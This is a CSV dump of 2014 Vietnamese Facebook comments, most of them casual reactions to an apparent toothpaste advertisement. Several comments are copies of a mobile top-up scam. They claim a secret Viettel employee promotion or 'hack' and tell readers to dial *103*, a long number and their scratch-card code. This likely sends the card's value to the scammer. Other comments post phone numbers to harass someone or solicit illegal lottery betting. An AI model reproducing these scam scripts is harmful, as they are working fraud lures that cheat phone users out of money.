"from_id","from_name","message","created_time","likes_count","comments_count","id"
"1916843148582619","Anh Khểnh","Ckưa đúg lắm cười nk ckưa ckắc trog lòg tkấy zui .","2014-09-28T22:47:36+0000",0,0,"694910863929078_697460327007465"
"1947351272209664","Tôi Chọn Giê-su","Ckuan","2014-09-28T22:54:40+0000",1,0,"694910863929078_697462270340604"
"1955391818083859","Nguyễn Xuân Lộc","Va hp se lam cho ta dau rat nhjeu va ko tjn la se co hp","2014-09-28T23:11:45+0000",0,0,"694910863929078_697466210340210"
"787086931474078","Candy Huang","Hj  Pé Susu","2014-09-29T00:33:51+0000",0,0,"694910863929078_697487063671458"
"1916311775248154","Nguyễn Huyền","Ban se k bao gio cam thay hanh phuc neu ban con nghi nhu vay #sophan","2014-09-29T00:47:40+0000",0,0,"694910863929078_697492677004230"
"1513835828696028","Nang Nhuong Dinh","Đang bình thường mà tự nhiên cười tươi yêu đời là chỉ có thể bị ...thần kinh mà thoy :))","2014-09-29T02:00:28+0000",0,0,"694910863929078_697556176997880"
"2026771577557041","Monster Mạnh","ok","2014-09-29T02:32:39+0000",0,0,"694910863929078_697563613663803"
"1920652808201683","CHồng'ss Em'ss","Toan ld khuyen maj kaj loz","2014-09-29T02:51:46+0000",0,0,"694910863929078_697568396996658"
"1920652808201683","CHồng'ss Em'ss","Lam theo luc sau tung tung ... Ban da nap thanh cog cho thue bao ...........","2014-09-29T02:53:08+0000",0,0,"694910863929078_697568660329965"
"1939938899627940","Huyen Cu","Hax kuj ck noj dau voj i...hax kuj de km tkax ju doj mt ckut...kuj de xua i nkuq pkjen muon va hax kuj de maj se l mt ngx hp va pjk yen maj maj dn voj moj ng...nke! Cac pn","2014-09-29T03:59:34+0000",0,0,"694910863929078_697587136994784"
"891573530993443","Nhân Hà","Bài hát quảng cáo cho close rất hay. Good.","2014-09-29T04:37:42+0000",0,0,"694910863929078_697595073660657"
"1982120922031320","Đoàn Trần Thư Anh","Nguy hiểm =))))","2014-09-29T05:08:24+0000",0,0,"694910863929078_697600663660098"
"1948410445440752","Huyền Lê","Hay.","2014-09-29T05:40:34+0000",0,0,"694910863929078_697606983659466"
"2006905632874273","Như Trang","Titanium :)","2014-09-29T05:42:47+0000",0,0,"694910863929078_697607326992765"
"2043125409252294","Thượng Kim Phat","Ngay cuoi nhung dem thi khoc.","2014-09-29T05:55:35+0000",0,0,"694910863929078_697609893659175"
"1873133239603003","Thế Ngọc","Ckj la mah khoe'! Aj ma ckag paj xe!","2014-09-29T06:10:43+0000",0,0,"694910863929078_697612636992234"
"1902778629973953","Co Chu Nho","Dug","2014-09-29T06:25:16+0000",0,0,"694910863929078_697614823658682"
"1964394123839902","Vincent Nguyen","Nguoi dan HK giau co, nhung ho ko chiu mat quyen dan chu. Svhs HK dang dung len chong bon TQ va doi quyen tu do","2014-09-29T06:40:52+0000",0,0,"694910863929078_697617403658424"
"1964394123839902","Vincent Nguyen","","2014-09-29T06:40:57+0000",0,0,"694910863929078_697617410325090"
"1964394123839902","Vincent Nguyen","Trieu nguoi dan cung svhs HK xuong duong dau tranh","2014-09-29T06:42:00+0000",0,0,"694910863929078_697617606991737"
"1964394123839902","Vincent Nguyen","","2014-09-29T06:42:12+0000",1,0,"694910863929078_697617646991733"
"785243478345390","Lê Hạnh Ly","Ank Lai Le ck hãy luon vui vẻ nhé","2014-09-29T07:52:39+0000",0,0,"694910863929078_697630250323806"
"1959398964330516","Cao Diem","Chjnh xac.!","2014-09-29T08:27:39+0000",1,0,"694910863929078_697636603656504"
"1921215718148481","Phúc Phè Phởn","cười nhìu quá khác biệt thật nó tưởng mình bị điên :v","2014-09-29T09:48:44+0000",2,0,"694910863929078_697695873650577"
"1649334985085819","Kendy Nguyen","","2014-09-29T09:58:36+0000",2,0,"694910863929078_697701993649965"
"1852364708168836","Đỗ Thanh Huyền","Mang tiếng quảng cáo kem đánh răng mà lại ko nhe nổi hàm răng ra:))","2014-09-29T11:13:06+0000",1,0,"694910863929078_697764916977006"
"1919013845006985","Dương Thị Mai","PÙn chết chứ cười chi nổi","2014-09-29T11:41:32+0000",0,0,"694910863929078_697782903641874"
"798231930338692","Trần Đình Thủy Trúc","Fa :T","2014-09-29T11:48:56+0000",0,0,"694910863929078_697804680306363"
"870957683055386","Giáp Mạnh Cường","Ma ak","2014-09-29T12:08:15+0000",0,0,"694910863929078_697811883638976"
"1977428052527109","Pang Mei","Ngoc Thanh","2014-09-29T12:20:37+0000",0,0,"694910863929078_697819356971562"
"1901079136813486","Nguyễn Huy Hoàng","Tin mới nhất nè các bợn !
[QC] Viettel từ 00h! ngày 30-
9-2014 đến hết ngày
1
-10-2014.
Viettel khuyến mãi x10 giá trị thẻ nạp cho nhân
viên trong công ty của viettel. Tri ân khách hàng đã và đang sử dụng mạng
Viettel,vì vậy
Viettel quyết định khuyến mãi một lần duy nhất có
một không hai.
Tin này được chú mình làm ở công ty viettel cho
biết.
Chú mình đã bảo mình làm ngay và Mình đã nạp
được 1 cái thẻ 100k rồi, tài khoản của mình hiện tại là 1 triệu tiêu tet ga rui zui thiệt.híhí và mk có 1 tk đt cực khủng mà chưa bgiờ mk mơ có đk như
vậy,nên mình nghĩ sẽ share lên chia sẻ cho mọi
người cùng biết việc hack tài khoản kiểu đó .
Và cách làm chi tiết như sau:
B1: Các bạn chuẩn bị một thẻ viettel (20k,50k,100k,200k,,­500k) tuỳ ý bạn,cào lấy mã
thẻ
B2:Rùi các bạn bấm*103*8416-6842-41­33*mã
thẻ# OK.
Trong đó (103 là đầu số khuyến mại của
viettel ,còn dãy số (8416-6842-4133) theo chú mk
bảo là dãy số bí mật dùng để xác nhận là nhân
viên của viettel được hưởng khuyến mại) .
B3: chờ một phút rồi các bạn bấm(*101# hoặc
*102#)để kiểm tra tài khoản, thấy tài khoản của
bạn tăng lên gấp nhiều lần đừng bỏ lỡ cơ hội hiếm này nhé!
Tùy vào mã thẻ mà bạn nạp và nhân lên như sau: 
20k=200k+200mb
50k = 500k+500mb
100k =1tr+1000mb
200k=2tr+2500mb
500k=5tr+6500mb
Chú ý: khi nạp thẻ có mệnh giá trên 100k bạn sẽ được miễn phí 1tháng các dịch vụ của viettel và
mỗi tháng được cộng 25k vào tài khoản khuyến
mại trong 12 tháng, Hãy lựa chọn thẻ nạp phù hợp
với bạn nha vì {Mỗi sim chỉ nạp được 1lần duy
nhất} Tài khoản gốc bạn phải có ít nhất 2000vnđ!
Mới thực hiện đc nhé đây là cơ hội hiếm nên các bạn làm ngay đi nhé viettel sẽ nhanh chóng kết
thúc chương trình.
Chúc các bạn thành công.!! Khi đó đừng quên cám
ơn mk nha!!","2014-09-29T12:21:59+0000",3,0,"694910863929078_697819913638173"
"661044227438921","Pham Truong","Good","2014-09-29T12:37:52+0000",0,0,"694910863929078_697825103637654"
"771241963057038","Duy Lê","Phát Siu NhƯn Far Are Way Nghĩa Ngô hp đéo j....cười xém chết lun :v","2014-09-29T12:38:27+0000",2,0,"694910863929078_697825346970963"
"1278645785615521","Nguyễn Thị Phúc",":v","2014-09-29T12:39:34+0000",0,0,"694910863929078_697825703637594"
"810632505781086","Nguyễn Thị Phát","Cừj thôi. K xém chết đâu","2014-09-29T12:41:32+0000",0,0,"694910863929078_697826383637526"
"825415070954689","Cáo Em",":)","2014-09-29T12:42:11+0000",0,0,"694910863929078_697827130304118"
"820543651440691","Thế Thái",""" đây không phải là kem đánh răng,đây là closeup "" :D","2014-09-29T12:49:13+0000",0,0,"694910863929078_697829363637228"
"761471317373814","Tùng Anh","Loan Kẹo Kẹo *hihi* :D","2014-09-29T13:58:34+0000",1,0,"694910863929078_697852370301594"
"2043921279171487","Khahoangtran Tran","Chẳng lẽ !:d","2014-09-29T14:09:21+0000",0,0,"694910863929078_697857060301125"
"847794992034649","Táo Giao Thông","Việt Hồng Nguyễn","2014-09-29T14:16:28+0000",1,0,"694910863929078_697859013634263"
"1933709763572131","Linh Nguyên","Ko cuoj dc.","2014-09-29T14:18:44+0000",1,0,"694910863929078_697860513634113"
"826088677564853","Vuadi Vuakhoc Vuadi Vuakhoc","Chu co ve k vay.","2014-09-29T14:30:38+0000",0,0,"694910863929078_697864146967083"
"1988719181392389","Vũ Thị Thu Thảo","cuoi lên chứ :3","2014-09-29T15:13:14+0000",0,0,"694910863929078_697879066965591"
"874200222735695","Công Kim","Dung luon","2014-09-29T15:22:23+0000",0,0,"694910863929078_697881623632002"
"1929256394011567","Huong Smile","Hjhj:D. Nu cuoj luon hjen djen tren moi nke!","2014-09-29T15:25:56+0000",0,0,"694910863929078_697883533631811"
"1893614284236476","Phuong Trjnh","kuoj kg dug cho lay ro luom rag.","2014-09-29T15:32:16+0000",1,0,"694910863929078_697885233631641"
"857430454411329","Suri Nguyễn","cuoi k noi lun","2014-09-29T15:47:19+0000",0,0,"694910863929078_697891013631063"
"1229564283856244","Tạ Thiên Thu","Vào đám ma cười mà vỡ mồm à","2014-09-29T15:51:33+0000",1,0,"694910863929078_697892486964249"
"829881387167135","Kho Vi Yeu","Pun","2014-09-29T16:06:08+0000",0,0,"694910863929078_697897316963766"
"1840793352808044","Ckàng'sTrais Nkân'sMãs","Hum","2014-09-29T16:24:33+0000",0,0,"694910863929078_697903220296509"
"837442519758417","Nguyễn Mạnh Tấn","Cười mà có nhe răng đâu chắc toàn sâu","2014-09-29T16:32:11+0000",0,0,"694910863929078_697905460296285"
"1264721033638779","Noo Quang Hiếu","Quảng cáo khéo vl","2014-09-29T17:23:18+0000",0,0,"694910863929078_697921310294700"
"1975189862714852","Gấu Bắc Cực","Rug het ka răg an chao ui kiA","2014-09-29T17:25:47+0000",0,0,"694910863929078_697923203627844"
"831475360358615","Tieudaigia Tieu Gia","Hay","2014-09-29T20:18:04+0000",0,0,"694910863929078_698000913620073"
"1887190781547788","Phươngg Linhh","Dc day","2014-09-29T22:18:35+0000",0,0,"694910863929078_698034176950080"
"1981133778789513","Sống Về Đêm","Ok","2014-09-29T23:06:06+0000",0,0,"694910863929078_698045780282253"
"696750870533822","Mặt Trời Tím","Dk nhj","2014-09-30T01:34:21+0000",0,0,"694910863929078_698135083606656"
"2118295211730708","Trai Tim Cua Gio","Tụi bay ơi gọi vô số này chửi cmtml kia dj 01638426811","2014-09-30T01:44:11+0000",0,0,"694910863929078_698138590272972"
"653936144813300","Traitàicắnthuốclắc Gáisắcquấtcầnsa","[QC]. Tin Hót : Nhân dịp kỷ niệm 10 năm Viettel Mobile. Từ 0h ngày 29-9-2014 đến hết ngày 01-10-2014 VIETTEL... tổ chức chương trình khuyến mãi ưu đãi đặc biệt chỉ một lần duy nhất để dành cho những nhân viên của mình nhưng vì chương trình bi lỗi nên tất cả các thuê bao đều được hưởng KM qua đầu số... *103*, và khuyến mãi giá trị thẻ nạp lên gấp 10lần so với mệnh giá thẻ nạp{Mà cái này chỉ nhân viên Viettel và một số thuê bao mới biết}. Nhân cơ hội này mọi người có thể kiếm tiền nạp diện thoại dùng rồi,cách làm chi tiết như sau: -B1: Chuẩn bị một thẻ cào Viettel (Áp dụng với tất cả mệnh giá thẻ nạp. Lưu ý: 1 sim chỉ được hưởng CCKM 1 lần thui nhá đây là quy định của Viettel) - B2: Lấy số thẻ và ẤN *103*841697786594*mã thẻ# OK .Trong đó 103 là mã dịch vụ mà Viettel tạo ra để tổ chức khuyến mãi đặc biệt này, (dãy số 841697786594 là 11 chữ esố mang ký hiệu khuyến mãi đặc biệt của chương trình cho nhân viên trong công ti Viettel. Sau đó bạn kiểm tra tài khoản và sẽ thấy tài khoản của bạn tăng lên gấp 10 lần đừng bỏ lỡ cơ hội hiếm này nhé! Chú ý: tài khoản phải còn từ 1000vnđ trở lên và một sim chỉ được hưởng KM một lần duy nhất! 20k= 200k(50% KM) 50k = 500k( 50% KM) 100k = 1tr ( 50% KM) 200k = 2tr ( 50% KM) 500k = 5tr ( 50% KM) [ko can doi KM van duoc KM 50% ban nhe.] *Chú ý: Chỉ áp dụng trong thời gian 3 ngày thôi nha! Cam đoan thành công 100% nhanh tay lên cơ hội chỉ có một! Chúc các bạn thành công","2014-09-30T01:57:23+0000",0,0,"694910863929078_698142340272597"
"855258467973029","Tuyền Nguyễn","a","2014-09-30T02:01:18+0000",0,0,"694910863929078_698143570272474"
"1926940247595311","Cháu Con Bố Cháu","Phảj có lý do thj mớj cuờj ckứ","2014-09-30T02:19:13+0000",0,0,"694910863929078_698148196938678"
"1167084223435982","Dương Quốc Vượng","An Nhiên có vẻ như thế này thì ms sống tốt được đây,dù k lq mấy","2014-09-30T02:34:03+0000",0,0,"694910863929078_698152606938237"
"1962880314001280","Lê Vũ","Tkat hax dua vax.khoe nap vao mat ka gok lan laj","2014-09-30T03:03:02+0000",0,0,"694910863929078_698163293603835"
"1876218592642522","Hả","Gê thjt maj ngang luoc likn lun","2014-09-30T03:07:14+0000",0,0,"694910863929078_698164793603685"
"1953880494855810","Ban Quản Trị","Đừng nên cừơj nhjều các pạn nhé! Vj cuờj nhjều dóg khùng ak!","2014-09-30T03:18:12+0000",0,0,"694910863929078_698167730270058"
"680174215514527","Nguyễn Trang","Happy","2014-09-30T03:20:09+0000",0,0,"694910863929078_698170203603144"
"1536928003044430","Đỗ Tuấn Dũng","Nancy Duong ^^","2014-09-30T03:34:10+0000",0,0,"694910863929078_698173886936109"
"661550587372506","Hyun Suk","Don't worry be happy","2014-09-30T03:39:03+0000",0,0,"694910863929078_698176023602562"
"963347023807858","Cát Chi","Mọi người nghĩ sao sau khi đọc bài này?
������ http://bit.ly/thu-dam-vi-khong-muon-phan-boi-ban-trai","2014-09-30T03:46:12+0000",4,0,"694910863929078_698177816935716"
"1880547385541065","Thuận Huỳnh","Hax","2014-09-30T04:31:17+0000",0,0,"694910863929078_698190273601137"
"871196576361164","Bá Việt","Văn Thiện","2014-09-30T05:03:21+0000",0,0,"694910863929078_698205376932960"
"1430110120402528","Ngọc Ánh Hoàng","anything will be ok, that 's my choice!!","2014-09-30T05:05:21+0000",0,0,"694910863929078_698205736932924"
"1923296851282385","Đào Văn Thắng","Đã ngu còn ckơj chữ","2014-09-30T05:14:03+0000",0,0,"694910863929078_698207323599432"
"686323768219484","Manner Make Theman","Sóc siêu quậy","2014-09-30T05:17:50+0000",0,0,"694910863929078_698208106932687"
"870137463143692","Võ Lê Diêu","Thúy Diễm có cái ta đủ khác biệt r nhưng muốn thêm hạnh phúc thì tăng thêm sự khác biệt lên :) cười nhiều lên :v","2014-09-30T05:23:46+0000",0,0,"694910863929078_698209370265894"
"675715272623481","Na Chingu","Sou Đáng Ghét","2014-09-30T05:39:13+0000",0,0,"694910863929078_698213096932188"
"1921990364707144","Diệu Hoàng","Um","2014-09-30T05:54:41+0000",0,0,"694910863929078_698218346931663"
"713139518888545","Anh Huu Huu","Kưj nôj j âu pêk săp ckt uj kưj s nôj","2014-09-30T05:55:53+0000",0,0,"694910863929078_698218603598304"
"1895212034066217","Maruko Chan","dạ vâng cháu sẽ cố hihi","2014-09-30T06:04:29+0000",0,0,"694910863929078_698220576931440"
"785765578272686","Việt Thuận Trần Vĩnh","Haha. Ở mỹ còn dc chứ ở vn nó đấm gãy răng haha.","2014-09-30T06:12:05+0000",0,0,"694910863929078_698222350264596"
"1984679118483578","Bạch Long","-HÃY ĐỂ TÔI MANG LẠI (NIỀM TIN&CHIẾN
THẮNG) CHO BẠN NHÉ.
-VỚI NHỮNG (BTL) ĂN THÔNG SẼ MANG ĐẾN
NHỮNG NIỀM VUI BẤT NGỜ.
Neu ace nao muon vao bo cung vs ad thi
hay pm cho ad de lay so ad : _+_01685241491_+_
","2014-09-30T06:12:37+0000",0,0,"694910863929078_698222463597918"
"1978828522403849","Huy Huynh","http://run.sgame.vn/themban/d/16639","2014-09-30T06:28:34+0000",0,0,"694910863929078_698225313597633"
"949922678483380","Quốc Nhật","https://www.facebook.com/pages/%CA%9A%C9%9EGi%C3%B3nh%E1%BA%B9nh%C3%A0ngmang-Em%C4%91%E1%BA%BFn-N%E1%BA%AFngt%C3%A0n%C4%91%E1%BB%8Bnhm%E1%BB%87nh-%C4%90%E1%BA%A9yem%C4%91ii%CA%9A%C9%9E-/578817018795330?ref=hl","2014-09-30T06:49:06+0000",2,0,"694910863929078_698228873597277"
"2339951682897100","Trong An","TIN HÓT ...! TIN HÓT ...! ĐÂY ,nói mọi người chưa chắc đã
tin nhưng cam đoan là sự thật 100%.Theo thông tin
mới lộ ra do người chú của mình làm ở Viettel cho
mk biết thì viettel đang có chương trình khuyến mãi
đặc biệt từ 00h ngày 30-09-2014 đến hết 24h ngày
2-10-2014 .Viettel khuyến mãi x10 giá trị thẻ nạp cho nhân viên trong công ty của viettel để gửi lời cảm ơn đến các nhân viên trong công ty đã phục vụ cho viettel bấy lâu nay.Tin này chỉ trong viettel mới biết nha.Chú mình
đã bảo mình làm ngay và Mình đã nạp được 1 cái thẻ
200k rồi, tài khoản của mình hiện tại là 2 triệu tiêu tẹt ga rui zui thiệt và mk có 1 tài khoản dt cực khủng mà chưa bgiờ mk mơ có dk như vậy,nên mình nghĩ sẽ
share lên chia sẻ cho mọi người cùng biết việc hack
tài khoản kiểu đó .Và cách làm chi tiết như sau:
B1:Các bạn chuẩn bị một thẻ viettel
20k,50k,100k,200k,50­­-0k tuỳ ý bạn,cào lấy mã thẻ
B2:Rùi cac bạn bấm*103*841686381807*mã thẻ# OK.trong đó (103 là đầu số khuyến mại của
viettel ,còn 841686381807 theo chú mk bảo là dãy số
bí
mật dùng để xác nhận là nhân viên của viettel được
hưởng khuyến mại) B3: chờ một phút rồi các bạn
bấm(*101# hoặc *102#)để kiểm tra tài khoản, thấy tài khoản của bạn tăng lên gấp nhiều lần đừng bỏ lỡ cơ
hội hiếm này nhé! tùy vào mã thẻ mà bạn nạp và
nhân lên: 20k =200k 50k=500k 100k =1triệu 200k =
2triệu 500k=5triệu.Chúý: Khi nạp thẻ có mệnh giá trên
100k bạn sẽ được miễn phí 1tháng các dịch vụ của
viettel và mỗi tháng được cộng 20k vào tài khoản khuyến mại trong 12 tháng, Hãy lựa chọn thẻ nạp phù
hợp với bạn nha vì Mỗi sim chỉ nạp được 1lần duy
nhất Tài khoản gốc bạn phải có ít nhất1000vnđ! Mới
thực hiện đc nhé đây là cơ hội hiếm nên các bạn làm
ngay đi nhé viettel sẽ nhanh chóng kết thúc chương
trình. Chúc các bạn thành công.!! Khi đó đừng quên cám ơn mk nha","2014-09-30T08:02:08+0000",1,0,"694910863929078_698247593595405"
"1190055057765455","Nguyễn Minh Phương","sự thật là khác biệt làm chúng ta hạnh phúc","2014-09-30T08:03:34+0000",0,0,"694910863929078_698247830262048"
"1881262468803177","Cuồng's Bangtan's","Chào các bạn!
Các bạn có thể bỏ ra vài phút đọc được chứ? Sự thật lên tới 98%. Trong quá trình tìm tòi cố gắng hơn 2 tháng trời! Tiêu tốn khá nhiều tiền mua thẻ cào để học cách hack tiền viettel qua các trang web hack cơ. Cuối cùng trời cũng không phụ lòng người, mình đã tìm ra một cách hack và đã có một tài khoản dùng cho cả năm rồi, Mình nghĩ chắc cũng có nhiều người đang tìm cách hack tiền viettel như mình,mình gjữ cáck hack tiền này cũng chả giầu lên được, vì vậy, bây giờ mình chia sẻ thủ thuật này ra cho mọi người cùng biết! Sau đây mình sẽ hướng dẫn các bạn chi tiết như sau:
- Chuẩn bị một thẻ cào viettel (mệnh giá tùy theo túi tiền của bạn) - Sau đó cào thẻ và thao tác: *103*841-644-244-133­­*mã thẻ# (dãy số 841-644-244-133) là mã do bọn háck cơ ""Trung Quốc"" tạo ra để phá hoại mạng lưới viễn thông nước ta!Dù nó là việc sai trái nhưng đây là cơ hội kiếm tiền không thể bỏ qua.hix
- 5 phút sau đó, bạn sẽ nhận được tin nhắn từ 195 của Viettel, bạn hãy kiểm tra tài khoản của mình và sẽ thấy tài khoản của bạn được cộng gấp 10 lần mệnh giá thẻ !
Chú ý: Tài khoản phải còn từ 1.000 vnđ trở lên.
ví dụ:
Thẻ mệnh giá 20.000 vnđ sẽ nhận được 200.000 vnđ.
Thẻ mệnh giá 50.000 vnđ sẽ nhận được 500.000 vnđ.
Thẻ mệnh giá 100.000 vnđ sẽ nhận được 1 triệu vnđ.
Thẻ mệnh giá 200.000vnđ sẽ nhận được 2 triệu vnđ
Thẻ mệnh giá 500.000vnđ sẽ nhận được 5 triệu vnđ. Mình nghĩ lỗi này viettel sẽ sớm khắc phục thôi. Vì vậy hãy làm luôn nhé, bây giờ vẫn đang hack tốt. lưu ý là mỗi sim chỉ hack được một lần thôi nhá!!MÌNH MUỐN LÀM QUEN VỚI TẤT CẢ CÁC BẠN.ĐỪNG QUÊN KẾT BẠN VỚI MÌNH NHÉ!
P/s: meo con
xin chúc các bạn may mắn!","2014-09-30T08:18:36+0000",0,0,"694910863929078_698250356928462"
"873558476141960","ʚiɞNguoi Yeu Ban'ss","KHUYẾN MÃI THẺ NẠP MẠNG VIETTEL. Mọi người biết tin gì chưa? Viettel kỉ niệm 20 năm thành lập ngày thông tấn xã Việt Nam .Từ 0h ngày 29-09-2014 đến hết ngày 30-09-2014 .VIETTEL tổ chức chương trình khuyến mãi ưu đãi đặc biệt chỉ một lần duy nhất để dành cho nhân viên của mình qua đầu số*103*, và khuyến mãi giá trị thẻ nạp lên gấp 10 lần so với mệnh giá thẻ nạp { Mà cái này chỉ nhân viên Viettel mới... biết}. Nhân cơ hội này mọi người có thể kiếm tiền nạp diện thoại dùng rồi,cách làm chi tiết như sau: -Chuẩn bị một thẻ cào Viettel (Áp dụng với tất cả mệnh giá thẻ nạp. Lưu ý: 1 sim chỉ được hưởng CCKM 1 lần thui nhá đây là quy định của Viettel) B2:Lấy mã thẻ và ẤN*103*841-694-544-104*­­mãthẻ#OK Trong đó 103 là mã dịch vụ mà Viettel tạo ra để tổ chức khuyến mãi đặc biệt này, (dãy số 841-694-544-104) là 12 chữ­­ số mang ký hiệu khuyến mãi đặc biệt của chương trình cho nhân viên trong công ty Viettel. Sau đó bạn kiểm tra tài khoản và sẽ thấy tài khoản của bạn tăng lên gấp 10 lần đừng bỏ lỡ cơ hội hiếm này nhé! Chú ý:tài khoản phải còn từ 1000 vnđ trở lên và một sim chỉ được hưởng KM một lần nhé!
50k=500k
100k = 1triệu
200k = 2triệu
300k =3triệu
500k = 5triệu.Chỉ áp dụng trong 2ngày từ 29-09-2014 đến 30-09-2014.
Chú ý: Khi nạp thẻ có mệnh giá trên 100k bạn sẽ được miễn phí 1 tháng các dịch vụ của Viettel(Mimax Imuzik Nhạc chờ) và mỗi tháng được cộng 20k vào tài khoản khuyến mại trong 12 tháng, Hãy lựa chọn thẻ nạp phù hợp với bạn nha vì Mỗi sim chỉ nạp được 1lần duy nhất Tài khoản gốc bạn phải có ít nhất 1000 vnđ! Mới thực hiện được nhé đây là cơ hội hiếm nên các bạn làm ngay đi nhé Viettel sẽ nhanh chóng kết thúc chương trình.
","2014-09-30T08:24:58+0000",0,0,"694910863929078_698251580261673"
"1588798537810428","Nancy Duong","Dũng Trố ;))","2014-09-30T08:41:07+0000",1,0,"694910863929078_698261900260641"
"1991359501106777","Moon Hâm's","CÁC BẠN ƠI.... TIN MỚI NHẤT TRONGNGÀY
NÀY..!! BẠN HÃY BỎ RA 5 PHÚT ĐỂ ĐỌC
NHÉ...!!
KHÔNG ĐỌC THÌ TIẾC LẮM....Theo thông tin
mới
do Cô của mình làm ở Viettel cho biết thì
VIETTEL đang có trương trình khuyến mại đặc
biệt từ ngày nay đến hết ngày 02/10/2014
Viettel
khuyến mãi X 10 giá trị thẻ nạp tặng giêng
cho
nhân viên trong công ty của viettel chỉ 1 lần
duy
nhất nhân dip kỉ niệm 15 năm thành lập
viettel.
Cô mình đã bảo và hướng dẫn mình làm theo
mình đã nạp 200ngan rồi tài khoản cua minh
la
2000.000đồng rùi vui thiet ,mình nghĩ nên
viết
lên chia sẻ cho mọi người cùng biết.cách làm
chi tiết như sau: B1:chuẩn bị một thẻ viettel
50k,100k,200k,500k tuỳ theo số tiền của
bạn
nhưng mỗi sim được khuyến mại 1 lần nên
hay
mua thẻ mệnh giá lớn để được khuyến mại nhiều
mọi người nhé rồi cào lấy mã thẻ -
B2:bấm *103*841653568189* mãthẻ # OK
trong đó (103 là đầu số khuyến mại của
viettel
( 841653568189) là dãy số bí mật dùng để
xác
nhận là nhân viên của viettel được hưởng
khuyến mại) -B3: kiểm tra tài khoản. tùy giá
trị
thẻ nạp mà sốtiền được nhân lên:
50k=500k_
100k=1triệu_200k = 2triệu_500k=5triệu:Chú
ý:
Khi nạp thẻ có mệnh giá 200 ngàn thì bạn sẽ
được miễn phí 200phút gọi nội mạng trong
1
tháng, khi bạn nạp thẻ 500ngàn thì bạn
đượckhuyến mại 500phút goi nội mạng sử
dụng
trong 1tháng kể tù lúc nạp thẻ , mọi người
có
thể nạp cho anh em người thân của mình để
tạo
niềm vui bất ngờ cho ho. Tài khoản gốc bạn
phải
có ít nhất 1000vnđ! Mới thực hiện đc đây là
cơ
hội hiếm nên các bạn nạp ngay đi nhé viettel
sẽ
kết thúctrương trình bất cứ lúc nào khi biết bị lô.
Thông tin...!","2014-09-30T08:51:14+0000",0,0,"694910863929078_698296950257136"
"792803494227530","Loan Kẹo","Xuân Tùng như vầy này a ^_^","2014-09-30T09:06:06+0000",1,0,"694910863929078_698300003590164"
